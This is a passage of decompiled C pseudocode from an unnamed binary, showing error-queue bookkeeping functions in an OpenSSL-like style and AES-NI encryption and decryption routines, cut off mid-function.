{
  char *v0; // esi
  int v1; // ecx
  int v2; // eax
  int v3; // eax

  v0 = sub_407FB0();
  while ( *((_DWORD *)v0 + 97) != *((_DWORD *)v0 + 96) )
  {
    v1 = *((_DWORD *)v0 + 96);
    if ( (v0[4 * v1] & 1) != 0 )
      break;
    *(_DWORD *)&v0[4 * v1] = 0;
    *(_DWORD *)&v0[4 * *((_DWORD *)v0 + 96) + 64] = 0;
    v2 = *((_DWORD *)v0 + 96);
    if ( (v0[4 * v2 + 192] & 1) != 0 )
    {
      sub_413490(*(void **)&v0[4 * v2 + 128]);
      *(_DWORD *)&v0[4 * *((_DWORD *)v0 + 96) + 128] = 0;
    }
    *(_DWORD *)&v0[4 * *((_DWORD *)v0 + 96) + 192] = 0;
    *(_DWORD *)&v0[4 * *((_DWORD *)v0 + 96) + 256] = 0;
    *(_DWORD *)&v0[4 * (*((_DWORD *)v0 + 96))-- + 320] = -1;
    if ( *((_DWORD *)v0 + 96) == -1 )
      *((_DWORD *)v0 + 96) = 15;
  }
  v3 = *((_DWORD *)v0 + 96);
  if ( *((_DWORD *)v0 + 97) == v3 )
    return 0;
  *(_DWORD *)&v0[4 * v3] &= ~1u;
  return 1;
}

//----- (00408310) --------------------------------------------------------
int __cdecl sub_408310(int a1, __int16 a2, __int16 a3, int a4, int a5)
{
  char *v5; // esi
  int v6; // eax
  int v7; // ecx
  int result; // eax

  v5 = sub_407FB0();
  v6 = (*((_DWORD *)v5 + 96) + 1) % 16;
  v7 = *((_DWORD *)v5 + 97);
  *((_DWORD *)v5 + 96) = v6;
  if ( v6 == v7 )
    *((_DWORD *)v5 + 97) = (v7 + 1) % 16;
  *(_DWORD *)&v5[4 * v6] = 0;
  *(_DWORD *)&v5[4 * *((_DWORD *)v5 + 96) + 64] = a3 & 0xFFF | (((a1 << 12) | a2 & 0xFFF) << 12);
  *(_DWORD *)&v5[4 * *((_DWORD *)v5 + 96) + 256] = a4;
  *(_DWORD *)&v5[4 * *((_DWORD *)v5 + 96) + 320] = a5;
  result = *((_DWORD *)v5 + 96);
  if ( (v5[4 * result + 192] & 1) != 0 )
  {
    sub_413490(*(void **)&v5[4 * result + 128]);
    *(_DWORD *)&v5[4 * *((_DWORD *)v5 + 96) + 128] = 0;
    *(_DWORD *)&v5[4 * *((_DWORD *)v5 + 96) + 192] = 0;
  }
  else
  {
    *(_DWORD *)&v5[4 * result + 192] = 0;
  }
  return result;
}

//----- (00408400) --------------------------------------------------------
int sub_408400()
{
  int result; // eax
  int v1; // esi
  int v2; // ebp
  bool v3; // zf
  int v4; // [esp+Ch] [ebp-4h]

  result = sub_407FB0();
  v4 = result;
  v1 = result + 128;
  v2 = 16;
  do
  {
    v3 = (*(_BYTE *)(v1 + 64) & 1) == 0;
    *(_DWORD *)(v1 - 128) = 0;
    *(_DWORD *)(v1 - 64) = 0;
    if ( !v3 )
    {
      sub_413490(*(void **)v1);
      result = v4;
      *(_DWORD *)v1 = 0;
    }
    *(_DWORD *)(v1 + 64) = 0;
    *(_DWORD *)(v1 + 128) = 0;
    *(_DWORD *)(v1 + 192) = -1;
    v1 += 4;
    --v2;
  }
  while ( v2 );
  *(_DWORD *)(result + 388) = 0;
  *(_DWORD *)(result + 384) = 0;
  return result;
}
// 407FB0: using guessed type int sub_407FB0(void);

//----- (00408480) --------------------------------------------------------
const char *__cdecl sub_408480(unsigned int a1, char *Str, unsigned int a3)
{
  const char *result; // eax
  int v4; // esi
  char *v5; // ebp
  char *v6; // eax
  int v7; // [esp+10h] [ebp-D0h]
  int v8; // [esp+14h] [ebp-CCh]
  _DWORD *v9; // [esp+18h] [ebp-C8h]
  char v10[64]; // [esp+1Ch] [ebp-C4h] BYREF
  char v11[64]; // [esp+5Ch] [ebp-84h] BYREF
  char v12[64]; // [esp+9Ch] [ebp-44h] BYREF

  v8 = sub_407DC0(a1);
  v7 = sub_407E50(a1);
  v9 = sub_407EE0(a1);
  if ( !v8 )
    sub_4191B0((int)v12, 64, "lib(%lu)", HIBYTE(a1));
  if ( !v7 )
    sub_4191B0((int)v10, 64, "func(%lu)", (a1 >> 12) & 0xFFF);
  if ( !v9 )
    sub_4191B0((int)v11, 64, "reason(%lu)", a1 & 0xFFF);
  sub_4191B0((int)Str, a3, "error:%08lX:%s:%s:%s", a1);
  result = (const char *)strlen(Str);
  if ( result == (const char *)(a3 - 1) && a3 > 4 )
  {
    result = Str;
    v4 = 0;
    v5 = &Str[a3];
    do
    {
      v6 = strchr(result, 58);
      if ( !v6 || v6 > &v5[v4 - 5] )
      {
        v6 = &v5[v4 - 5];
        *v6 = 58;
      }
      ++v4;
      result = v6 + 1;
    }
    while ( v4 < 4 );
  }
  return result;
}
// 408480: using guessed type char var_44[64];
// 408480: using guessed type char var_C4[64];
// 408480: using guessed type char var_84[64];

//----- (004085E0) --------------------------------------------------------
void sub_4085E0()
{
  char *v0; // esi

  v0 = sub_407FB0();
  if ( v0 )
  {
    sub_414780(&dword_5388C4, 0);
    sub_407B50(v0);
  }
}
// 5388C4: using guessed type DWORD dword_5388C4;

//----- (00408610) --------------------------------------------------------
void sub_408610(int a1, ...)
{
  va_list va; // [esp+8h] [ebp+8h] BYREF

  va_start(va, a1);
  sub_408110(a1, (int)va);
}

//----- (00408630) --------------------------------------------------------
int __cdecl sub_408630(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  char *v4; // edi
  int v5; // eax
  int v7; // esi
  int v8; // ebp
  int v9; // eax
  int v10; // eax

  v4 = sub_407FB0();
  v5 = *((_DWORD *)v4 + 97);
  if ( v5 == *((_DWORD *)v4 + 96) )
    return 0;
  v7 = (v5 + 1) % 16;
  v8 = *(_DWORD *)&v4[4 * v7 + 64];
  *((_DWORD *)v4 + 97) = v7;
  *(_DWORD *)&v4[4 * v7 + 64] = 0;
  if ( a1 && a2 )
  {
    v9 = *(_DWORD *)&v4[4 * v7 + 256];
    if ( v9 )
    {
      *a1 = v9;
      *a2 = *(_DWORD *)&v4[4 * v7 + 320];
    }
    else
    {
      *a1 = "NA";
      *a2 = 0;
    }
  }
  if ( a3 )
  {
    v10 = *(_DWORD *)&v4[4 * v7 + 128];
    if ( v10 )
    {
      *a3 = v10;
      if ( a4 )
        *a4 = *(_DWORD *)&v4[4 * v7 + 192];
    }
    else
    {
      *a3 = &unk_4F1291;
      if ( a4 )
      {
        *a4 = 0;
        return v8;
      }
    }
    return v8;
  }
  else
  {
    if ( (v4[4 * v7 + 192] & 1) != 0 )
    {
      sub_413490(*(void **)&v4[4 * v7 + 128]);
      *(_DWORD *)&v4[4 * v7 + 128] = 0;
    }
    *(_DWORD *)&v4[4 * v7 + 192] = 0;
    return v8;
  }
}

//----- (00408730) --------------------------------------------------------
int sub_408730()
{
  char *v0; // eax
  int v1; // ecx

  v0 = sub_407FB0();
  v1 = *((_DWORD *)v0 + 97);
  if ( v1 == *((_DWORD *)v0 + 96) )
    return 0;
  else
    return *(_DWORD *)&v0[4 * ((v1 + 1) % 16) + 64];
}

//----- (00408760) --------------------------------------------------------
int sub_408760()
{
  int v0; // eax
  int v1; // ecx

  v0 = sub_407FB0();
  v1 = *(_DWORD *)(v0 + 384);
  if ( *(_DWORD *)(v0 + 388) == v1 )
    return 0;
  else
    return *(_DWORD *)(v0 + 4 * v1 + 64);
}
// 407FB0: using guessed type int sub_407FB0(void);

//----- (00408780) --------------------------------------------------------
_OWORD *__cdecl sub_408780(__m128 *a1, _OWORD *a2, int a3)
{
  int v3; // ecx
  _OWORD *result; // eax
  __int128 *v6; // edx

  v3 = *(_DWORD *)(a3 + 240);
  result = a2;
  _XMM1 = *(_OWORD *)(a3 + 16);
  v6 = (__int128 *)(a3 + 32);
  _XMM2 = _mm_xor_ps(*a1, *(__m128 *)a3);
  do
  {
    __asm { aesenc  xmm2, xmm1 }
    --v3;
    _XMM1 = *v6++;
  }
  while ( v3 );
  __asm { aesenclast xmm2, xmm1 }
  *a2 = _XMM2;
  return result;
}

//----- (004087D0) --------------------------------------------------------
_OWORD *__cdecl sub_4087D0(__m128 *a1, _OWORD *a2, int a3)
{
  int v3; // ecx
  _OWORD *result; // eax
  __int128 *v6; // edx

  v3 = *(_DWORD *)(a3 + 240);
  result = a2;
  _XMM1 = *(_OWORD *)(a3 + 16);
  v6 = (__int128 *)(a3 + 32);
  _XMM2 = _mm_xor_ps(*a1, *(__m128 *)a3);
  do
  {
    __asm { aesdec  xmm2, xmm1 }
    --v3;
    _XMM1 = *v6++;
  }
  while ( v3 );
  __asm { aesdeclast xmm2, xmm1 }
  *a2 = _XMM2;
  return result;
}

//----- (00408820) --------------------------------------------------------
void __usercall sub_408820(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>)
{
  int v4; // ecx
  int v9; // edx
  int v10; // ecx
  bool v13; // zf

  v4 = 16 * a2;
  _XMM1 = *(_OWORD *)(a1 + 16);
  _XMM2 = _mm_xor_ps(a3, *(__m128 *)a1);
  _XMM3 = _mm_xor_si128(a4, *(__m128i *)a1);
  _XMM0 = *(_OWORD *)(a1 + 32);
  v9 = a1 + v4 + 32;
  v10 = 16 - v4;
  do
  {
    __asm
    {
      aesenc  xmm2, xmm1
      aesenc  xmm3, xmm1
    }
    _XMM1 = *(_OWORD *)(v9 + v10);
    v13 = v10 == -32;
    v10 += 32;
    __asm
    {
      aesenc  xmm2, xmm0
      aesenc  xmm3, xmm0
    }
    _XMM0 = *(_OWORD *)(v9 + v10 - 16);
  }
  while ( !v13 );
  __asm
  {
    aesenc  xmm2, xmm1
    aesenc  xmm3, xmm1
    aesenclast xmm2, xmm0
    aesenclast xmm3, xmm0
  }
}

//----- (00408880) --------------------------------------------------------
void __usercall sub_408880(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>)
{
  int v4; // ecx
  int v9; // edx
  int v10; // ecx
  bool v13; // zf

  v4 = 16 * a2;
  _XMM1 = *(_OWORD *)(a1 + 16);
  _XMM2 = _mm_xor_ps(a3, *(__m128 *)a1);
  _XMM3 = _mm_xor_si128(a4, *(__m128i *)a1);
  _XMM0 = *(_OWORD *)(a1 + 32);
  v9 = a1 + v4 + 32;
  v10 = 16 - v4;
  do
  {
    __asm
    {
      aesdec  xmm2, xmm1
      aesdec  xmm3, xmm1
    }
    _XMM1 = *(_OWORD *)(v9 + v10);
    v13 = v10 == -32;
    v10 += 32;
    __asm
    {
      aesdec  xmm2, xmm0
      aesdec  xmm3, xmm0
    }
    _XMM0 = *(_OWORD *)(v9 + v10 - 16);
  }
  while ( !v13 );
  __asm
  {
    aesdec  xmm2, xmm1
    aesdec  xmm3, xmm1
    aesdeclast xmm2, xmm0
    aesdeclast xmm3, xmm0
  }
}

//----- (004088E0) --------------------------------------------------------
void __usercall sub_4088E0(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>, __m128i a5@<xmm4>)
{
  int v5; // ecx
  int v11; // edx
  int v12; // ecx
  bool v16; // zf

  v5 = 16 * a2;
  _XMM1 = *(_OWORD *)(a1 + 16);
  _XMM2 = _mm_xor_ps(a3, *(__m128 *)a1);
  _XMM3 = _mm_xor_si128(a4, *(__m128i *)a1);
  _XMM4 = _mm_xor_si128(a5, *(__m128i *)a1);
  _XMM0 = *(_OWORD *)(a1 + 32);
  v11 = a1 + v5 + 32;
  v12 = 16 - v5;
  do
  {
    __asm
    {
      aesenc  xmm2, xmm1
      aesenc  xmm3, xmm1
      aesenc  xmm4, xmm1
    }
    _XMM1 = *(_OWORD *)(v11 + v12);
    v16 = v12 == -32;
    v12 += 32;
    __asm
    {
      aesenc  xmm2, xmm0
      aesenc  xmm3, xmm0
      aesenc  xmm4, xmm0
    }
    _XMM0 = *(_OWORD *)(v11 + v12 - 16);
  }
  while ( !v16 );
  __asm
  {
    aesenc  xmm2, xmm1
    aesenc  xmm3, xmm1
    aesenc  xmm4, xmm1
    aesenclast xmm2, xmm0
    aesenclast xmm3, xmm0
    aesenclast xmm4, xmm0
  }
}

//----- (00408960) --------------------------------------------------------
void __usercall sub_408960(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>, __m128i a5@<xmm4>)
{
  int v5; // ecx
  int v11; // edx
  int v12; // ecx
  bool v16; // zf

  v5 = 16 * a2;
  _XMM1 = *(_OWORD *)(a1 + 16);
  _XMM2 = _mm_xor_ps(a3, *(__m128 *)a1);
  _XMM3 = _mm_xor_si128(a4, *(__m128i *)a1);
  _XMM4 = _mm_xor_si128(a5, *(__m128i *)a1);
  _XMM0 = *(_OWORD *)(a1 + 32);
  v11 = a1 + v5 + 32;
  v12 = 16 - v5;
  do
  {
    __asm
    {
      aesdec  xmm2, xmm1
      aesdec  xmm3, xmm1
      aesdec  xmm4, xmm1
    }
    _XMM1 = *(_OWORD *)(v11 + v12);
    v16 = v12 == -32;
    v12 += 32;
    __asm
    {
      aesdec  xmm2, xmm0
      aesdec  xmm3, xmm0
      aesdec  xmm4, xmm0
    }
    _XMM0 = *(_OWORD *)(v11 + v12 - 16);
  }
  while ( !v16 );
  __asm
  {
    aesdec  xmm2, xmm1
    aesdec  xmm3, xmm1
    aesdec  xmm4, xmm1
    aesdeclast xmm2, xmm0
    aesdeclast xmm3, xmm0
    aesdeclast xmm4, xmm0
  }
}

//----- (004089E0) --------------------------------------------------------
void __usercall sub_4089E0(
        int a1@<edx>,
        int a2@<ecx>,
        __m128 a3@<xmm2>,
        __m128i a4@<xmm3>,
        __m128i a5@<xmm4>,
        __m128i a6@<xmm5>)
{
  int v7; // ecx
  int v13; // edx
  int v14; // ecx
  bool v19; // zf

  _XMM1 = *(_OWORD *)(a1 + 16);
  v7 = 16 * a2;
  _XMM2 = _mm_xor_ps(a3, *(__m128 *)a1);
  _XMM3 = _mm_xor_si128(a4, *(__m128i *)a1);
  _XMM4 = _mm_xor_si128(a5, *(__m128i *)a1);
  _XMM5 = _mm_xor_si128(a6, *(__m128i *)a1);
  _XMM0 = *(_OWORD *)(a1 + 32);
  v13 = a1 + v7 + 32;
  v14 = 16 - v7;
  do
  {
    __asm
    {
      aesenc  xmm2, xmm1
      aesenc  xmm3, xmm1
      aesenc  xmm4, xmm1
      aesenc  xmm5, xmm1
    }
    _XMM1 = *(_OWORD *)(v13 + v14);
    v19 = v14 == -32;
    v14 += 32;
    __asm
    {
      aesenc  xmm2, xmm0
      aesenc  xmm3, xmm0
      aesenc  xmm4, xmm0
      aesenc  xmm5, xmm0
    }
    _XMM0 = *(_OWORD *)(v13 + v14 - 16);
  }
  while ( !v19 );
  __asm
  {
    aesenc  xmm2, xmm1
    aesenc  xmm3, xmm1
    aesenc  xmm4, xmm1
    aesenc  xmm5, xmm1
    aesenclast xmm2, xmm0
    aesenclast xmm3, xmm0
    aesenclast xmm4, xmm0
    aesenclast xmm5, xmm0
  }
}

//----- (00408A70) --------------------------------------------------------
void __usercall sub_408A70(
        int a1@<edx>,
        int a2@<ecx>,
        __m128 a3@<xmm2>,
        __m128i a4@<xmm3>,
        __m128i a5@<xmm4>,
        __m128i a6@<xmm5>)
{
  int v7; // ecx
  int v13; // edx
  int v14; // ecx
  bool v19; // zf

  _XMM1 = *(_OWORD *)(a1 + 16);
  v7 = 16 * a2;
  _XMM2 = _mm_xor_ps(a3, *(__m128 *)a1);
  _XMM3 = _mm_xor_si128(a4, *(__m128i *)a1);
  _XMM4 = _mm_xor_si128(a5, *(__m128i *)a1);
  _XMM5 = _mm_xor_si128(a6, *(__m128i *)a1);
  _XMM0 = *(_OWORD *)(a1 + 32);
  v13 = a1 + v7 + 32;
  v14 = 16 - v7;
  do
  {
    __asm
    {
      aesdec  xmm2, xmm1
      aesdec  xmm3, xmm1
      aesdec  xmm4, xmm1
      aesdec  xmm5, xmm1
    }
    _XMM1 = *(_OWORD *)(v13 + v14);
    v19 = v14 == -32;
    v14 += 32;
    __asm
    {
      aesdec  xmm2, xmm0
      aesdec  xmm3, xmm0
      aesdec  xmm4, xmm0
      aesdec  xmm5, xmm0
    }
    _XMM0 = *(_OWORD *)(v13 + v14 - 16);
  }
  while ( !v19 );
  __asm
  {
    aesdec  xmm2, xmm1
    aesdec  xmm3, xmm1
    aesdec  xmm4, xmm1
    aesdec  xmm5, xmm1
    aesdeclast xmm2, xmm0
    aesdeclast xmm3, xmm0
    aesdeclast xmm4, xmm0
    aesdeclast xmm5, xmm0
  }
}

//----- (00408B00) --------------------------------------------------------
int __usercall sub_408B00@<eax>(
        int a1@<edx>,
        int a2@<ecx>,
        __m128 a3@<xmm2>,
        __m128i a4@<xmm3>,
        __m128i a5@<xmm4>,
        __m128i a6@<xmm5>,
        __m128i a7@<xmm6>,
        __m128i a8@<xmm7>)
{
  _XMM1 = *(_OWORD *)(a1 + 16);
  _XMM2 = _mm_xor_ps(a3, *(__m128 *)a1);
  _XMM3 = _mm_xor_si128(a4, *(__m128i *)a1);
  _XMM4 = _mm_xor_si128(a5, *(__m128i *)a1);
  __asm { aesenc  xmm2, xmm1 }
  _XMM5 = _mm_xor_si128(a6, *(__m128i *)a1);
  _XMM6 = _mm_xor_si128(a7, *(__m128i *)a1);
  __asm
  {
    aesenc  xmm3, xmm1
    aesenc  xmm4, xmm1
  }
  _XMM7 = _mm_xor_si128(a8, *(__m128i *)a1);
  __asm
  {
    aesenc  xmm5, xmm1
    aesenc  xmm6, xmm1
    aesenc  xmm7, xmm1
  }
  return sub_408B6E(-16 * a2 + 16);
}
// 408B6E: using guessed type int __thiscall sub_408B6E(_DWORD);

//----- (00408B6E) --------------------------------------------------------
void __usercall sub_408B6E(
        int a1@<edx>,
        int a2@<ecx>,
        __int128 _XMM0@<xmm0>,
        __int128 _XMM2@<xmm2>,
        __int128 _XMM3@<xmm3>,
        __int128 _XMM4@<xmm4>,
        __int128 _XMM5@<xmm5>,
        __int128 _XMM6@<xmm6>,
        __int128 _XMM7@<xmm7>)
{
  _XMM1 = *(_OWORD *)(a1 + a2);
  __asm
  {
    aesenc  xmm2, xmm0
    aesenc  xmm3, xmm0
    aesenc  xmm4, xmm0
    aesenc  xmm5, xmm0
    aesenc  xmm6, xmm0
    aesenc  xmm7, xmm0
  }
  _XMM0 = *(_OWORD *)(a1 + a2 + 32 - 16);
  if ( a2 != -32 )
    JUMPOUT(0x408B50);
  __asm
  {
    aesenc  xmm2, xmm1
    aesenc  xmm3, xmm1
    aesenc  xmm4, xmm1
    aesenc  xmm5, xmm1
    aesenc  xmm6, xmm1
    aesenc  xmm7, xmm1
    aesenclast xmm2, xmm0
    aesenclast xmm3, xmm0
    aesenclast xmm4, xmm0
    aesenclast xmm5, xmm0
    aesenclast xmm6, xmm0
    aesenclast xmm7, xmm0
  }
}
// 408B98: control flows out of bounds to 408B50

//----- (00408BE0) --------------------------------------------------------
void __usercall sub_408BE0(
        int a1@<edx>,
        int a2@<ecx>,
        __m128 a3@<xmm2>,
        __m128i a4@<xmm3>,
        __m128i a5@<xmm4>,
        __m128i a6@<xmm5>,
        __m128i a7@<xmm6>,
        __m128i a8@<xmm7>)
{
  __m128i v8; // xmm0
  int v9; // ecx
  int v18; // edx
  int v19; // ecx
  int v23; // ecx
  bool v27; // zf

  v8 = *(__m128i *)a1;
  v9 = 16 * a2;
  _XMM1 = *(_OWORD *)(a1 + 16);
  _XMM2 = _mm_xor_ps(a3, *(__m128 *)a1);
  _XMM3 = _mm_xor_si128(a4, *(__m128i *)a1);
  _XMM4 = _mm_xor_si128(a5, *(__m128i *)a1);
  __asm { aesdec  xmm2, xmm1 }
  _XMM5 = _mm_xor_si128(a6, *(__m128i *)a1);
  _XMM6 = _mm_xor_si128(a7, *(__m128i *)a1);
  __asm { aesdec  xmm3, xmm1 }
  v18 = a1 + v9 + 32;
  v19 = -v9;
  __asm { aesdec  xmm4, xmm1 }
  _XMM7 = _mm_xor_si128(a8, v8);
  _XMM0 = *(_OWORD *)(v18 + v19);
  v23 = v19 + 16;
  while ( 1 )
  {
    __asm
    {
      aesdec  xmm5, xmm1
      aesdec  xmm6, xmm1
      aesdec  xmm7, xmm1
    }
    _XMM1 = *(_OWORD *)(v18 + v23);
    v27 = v23 == -32;
    v23 += 32;
    __asm
    {
      aesdec  xmm2, xmm0
      aesdec  xmm3, xmm0
      aesdec  xmm4, xmm0
      aesdec  xmm5, xmm0
      aesdec  xmm6, xmm0
      aesdec  xmm7, xmm0
    }
    _XMM0 = *(_OWORD *)(v18 + v23 - 16);
    if ( v27 )
      break;
    __asm
    {
      aesdec  xmm2, xmm1
      aesdec  xmm3, xmm1
      aesdec  xmm4, xmm1
    }
  }
  __asm
  {
    aesdec  xmm2, xmm1
    aesdec  xmm3, xmm1
    aesdec  xmm4, xmm1
    aesdec  xmm5, xmm1
    aesdec  xmm6, xmm1
    aesdec  xmm7, xmm1
    aesdeclast xmm2, xmm0
    aesdeclast xmm3, xmm0
    aesdeclast xmm4, xmm0
    aesdeclast xmm5, xmm0
    aesdeclast xmm6, xmm0
    aesdeclast xmm7, xmm0
  }
}

//----- (00408CC0) --------------------------------------------------------
__int64 __usercall sub_408CC0@<xmm0>(const __m128i *a1, __m128 *a2, int a3, int a4, int a5)
{
  const __m128i *i; // esi
  _OWORD *v7; // edx
  unsigned int v8; // eax
  int v9; // ecx
  int v10; // ebx
  __m128 v11; // xmm2
  __m128i v12; // xmm3
  __m128i v13; // xmm4
  __m128i v14; // xmm5
  __m128i v15; // xmm6
  __m128i v16; // xmm7
  unsigned int v17; // eax
  bool v18; // cf
  unsigned int v19; // eax
  __m128 v20; // xmm2
  __m128i v21; // xmm3
  __m128i v22; // xmm4
  __m128i v23; // xmm5
  __m128i v24; // xmm6
  __m128 v25; // xmm0
  __int128 *v27; // edx
  int v30; // ebx
  __m128 v31; // xmm2
  __m128i v32; // xmm3
  __m128i v33; // xmm4
  __m128i v34; // xmm5
  __m128i v35; // xmm6
  __m128i v36; // xmm7
  unsigned int v37; // eax
  unsigned int v38; // eax
  __m128 v39; // xmm2
  __m128i v40; // xmm3
  __m128i v41; // xmm4
  __m128i v42; // xmm5
  __m128i v43; // xmm6
  __m128 v44; // xmm0
  __int128 *v46; // edx

  i = a1;
  v7 = (_OWORD *)a4;
  v8 = a3 & 0xFFFFFFF0;
  if ( (a3 & 0xFFFFFFF0) != 0 )
  {
    v9 = *(_DWORD *)(a4 + 240);
    if ( a5 )
    {
      v10 = *(_DWORD *)(a4 + 240);
      if ( v8 < 0x60 )
        goto LABEL_8;
      v11 = (__m128)_mm_loadu_si128(a1);
      v12 = _mm_loadu_si128(a1 + 1);
      v13 = _mm_loadu_si128(a1 + 2);
      v14 = _mm_loadu_si128(a1 + 3);
      v15 = _mm_loadu_si128(a1 + 4);
      v16 = _mm_loadu_si128(a1 + 5);
      for ( i = a1 + 6; ; i += 6 )
      {
        v17 = sub_408B00((int)v7, v9, v11, v12, v13, v14, v15, v16);
        v7 = (_OWORD *)a4;
        v9 = v10;
        v18 = v17 < 0x60;
        v19 = v17 - 96;
        if ( v18 )
          break;
        *a2 = v11;
        v11 = (__m128)_mm_loadu_si128(i);
        a2[1] = (__m128)v12;
        v12 = _mm_loadu_si128(i + 1);
        a2[2] = (__m128)v13;
        v13 = _mm_loadu_si128(i + 2);
        a2[3] = (__m128)v14;
        v14 = _mm_loadu_si128(i + 3);
        a2[4] = (__m128)v15;
        v15 = _mm_loadu_si128(i + 4);
        a2[5] = (__m128)v16;
        a2 += 6;
        v16 = _mm_loadu_si128(i + 5);
      }
      *a2 = v11;
      a2[1] = (__m128)v12;
      a2[2] = (__m128)v13;
      a2[3] = (__m128)v14;
      a2[4] = (__m128)v15;
      a2[5] = (__m128)v16;
      a2 += 6;
      v8 = v19 + 96;
      if ( v8 )
      {
LABEL_8:
        v20 = *(__m128 *)i;
        if ( v8 < 0x20 )
        {
          v25 = *(__m128 *)v7;
          _XMM1 = v7[1];
          v27 = v7 + 2;
          _XMM2 = _mm_xor_ps(v20, v25);
          do
          {
            __asm { aesenc  xmm2, xmm1 }
            --v9;
            _XMM1 = *v27++;
          }
          while ( v9 );
          __asm { aesenclast xmm2, xmm1 }
          *a2 = _XMM2;
        }
        else
        {
          v21 = i[1];
          if ( v8 == 32 )
          {
            sub_408820((int)v7, v9, v20, v21);
            *a2 = v20;
            a2[1] = (__m128)v21;
          }
          else
          {
            v22 = i[2];
            if ( v8 < 0x40 )
            {
              sub_4088E0((int)v7, v9, v20, v21, v22);
              *a2 = v20;
              a2[1] = (__m128)v21;
              a2[2] = (__m128)v22;
            }
            else
            {
              v23 = i[3];
              if ( v8 == 64 )
              {
                sub_4089E0((int)v7, v9, v20, v21, v22, v23);
                *a2 = v20;
                a2[1] = (__m128)v21;
                a2[2] = (__m128)v22;
                a2[3] = (__m128)v23;
              }
              else
              {
                v24 = i[4];
                sub_408B00((int)v7, v9, v20, v21, v22, v23, v24, (__m128i)0i64);
                *a2 = v20;
                a2[1] = (__m128)v21;
                a2[2] = (__m128)v22;
                a2[3] = (__m128)v23;
                a2[4] = (__m128)v24;
              }
            }
          }
        }
      }
    }
    else
    {
      v30 = *(_DWORD *)(a4 + 240);
      if ( v8 < 0x60 )
        goto LABEL_24;
      v31 = (__m128)_mm_loadu_si128(a1);
      v32 = _mm_loadu_si128(a1 + 1);
      v33 = _mm_loadu_si128(a1 + 2);
      v34 = _mm_loadu_si128(a1 + 3);
      v35 = _mm_loadu_si128(a1 + 4);
      v36 = _mm_loadu_si128(a1 + 5);
      for ( i = a1 + 6; ; i += 6 )
      {
        sub_408BE0((int)v7, v9, v31, v32, v33, v34, v35, v36);
        v7 = (_OWORD *)a4;
        v9 = v30;
        v18 = v37 < 0x60;
        v38 = v37 - 96;
        if ( v18 )
          break;
        *a2 = v31;
        v31 = (__m128)_mm_loadu_si128(i);
        a2[1] = (__m128)v32;
        v32 = _mm_loadu_si128(i + 1);
        a2[2] = (__m128)v33;
        v33 = _mm_loadu_si128(i + 2);
        a2[3] = (__m128)v34;
        v34 = _mm_loadu_si128(i + 3);
        a2[4] = (__m128)v35;
        v35 = _mm_loadu_si128(i + 4);
        a2[5] = (__m128)v36;
        a2 += 6;
        v36 = _mm_loadu_si128(i + 5);
      }
      *a2 = v31;
      a2[1] = (__m128)v32;
      a2[2] = (__m128)v33;
      a2[3] = (__m128)v34;
      a2[4] = (__m128)v35;
      a2[5] = (__m128)v36;
      a2 += 6;
      v8 = v38 + 96;
      if ( v8 )
      {
LABEL_24:
        v39 = *(__m128 *)i;
        if ( v8 < 0x20 )
        {
          v44 = *(__m128 *)v7;
          _XMM1 = v7[1];
          v46 = v7 + 2;
          _XMM2 = _mm_xor_ps(v39, v44);
          do
          {
            __asm { aesdec  xmm2, xmm1 }
            --v9;
            _XMM1 = *v46++;
          }
          while ( v9 );
          __asm { aesdeclast xmm2, xmm1 }
          *a2 = _XMM2;
        }
        else
        {
          v40 = i[1];
          if ( v8 == 32 )
          {
            sub_408880((int)v7, v9, v39, v40);
            *a2 = v39;
            a2[1] = (__m128)v40;
          }
          else
          {
            v41 = i[2];
            if ( v8 < 0x40 )
            {
              sub_408960((int)v7, v9, v39, v40, v41);
              *a2 = v39;
              a2[1] = (__m128)v40;
              a2[2] = (__m128)v41;
            }
            else
            {
              v42 = i[3];
              if ( v8 == 64 )
              {
                sub_408A70((int)v7, v9, v39, v40, v41, v42);
                *a2 = v39;
                a2[1] = (__m128)v40;
                a2[2] = (__m128)v41;
                a2[3] = (__m128)v42;
              }
              else
              {
                v43 = i[4];
                sub_408BE0((int)v7, v9, v39, v40, v41, v42, v43, (__m128i)0i64);
                *a2 = v39;
                a2[1] = (__m128)v40;
                a2[2] = (__m128)v41;
                a2[3] = (__m128)v42;
                a2[4] = (__m128)v43;
              }
            }
          }
        }
      }
    }
  }
  return 0i64;
}
// 408F03: variable 'v37' is possibly undefined

//----- (00409030) --------------------------------------------------------
__int64 __usercall sub_409030@<xmm0>(__m128 *a1, __m128 *a2, int a3, __int128 a4)
{
  __m128i v7; // xmm7
  int v9; // ecx
  __m128i v10; // xmm5
  __m128 v11; // xmm2
  int v12; // edx
  int v13; // ebx
  __m128i v14; // xmm7
  int v15; // ecx
  __m128 v16; // xmm6
  bool v23; // zf
  __m128i v28; // [esp+0h] [ebp-3Ch] BYREF
  __m128i v29; // [esp+10h] [ebp-2Ch]
  __int128 *v30; // [esp+30h] [ebp-Ch]
  __int128 vars0; // [esp+3Ch] [ebp+0h] BYREF

  v30 = &vars0;
  v7 = _mm_loadu_si128((const __m128i *)DWORD1(a4));
  _XMM3 = (__m128)_mm_loadu_si128((const __m128i *)DWORD2(a4));
  v9 = *(_DWORD *)(a4 + 240);
  v28.m128i_i64[0] = 0x8090A0B0C0D0E0Fi64;
  v28.m128i_i64[1] = 0x1020304050607i64;
  v29.m128i_i64[0] = 1i64;
  v29.m128i_i64[1] = 0i64;
  v9 *= 16;
  v10 = _mm_load_si128(&v28);
  v11 = (__m128)v7;
  v12 = a4 + 32 + v9;
  v13 = 16 - v9;
  v14 = _mm_shuffle_epi8(v7, v10);
  do
  {
    v15 = v13;
    v16 = *a1;
    _XMM2 = _mm_xor_ps(v11, *(__m128 *)a4);
    _XMM1 = *(_OWORD *)(a4 + 16);
    _XMM3 = _mm_xor_ps(_XMM3, _mm_xor_ps(*(__m128 *)a4, *a1));
    _XMM0 = *(_OWORD *)(a4 + 32);
    do
    {
      __asm
      {
        aesenc  xmm2, xmm1
        aesenc  xmm3, xmm1
      }
      _XMM1 = *(_OWORD *)(v12 + v15);
      v23 = v15 == -32;
      v15 += 32;
      __asm
      {
        aesenc  xmm2, xmm0
        aesenc  xmm3, xmm0
      }
      _XMM0 = *(_OWORD *)(v12 + v15 - 16);
    }
    while ( !v23 );
    __asm
    {
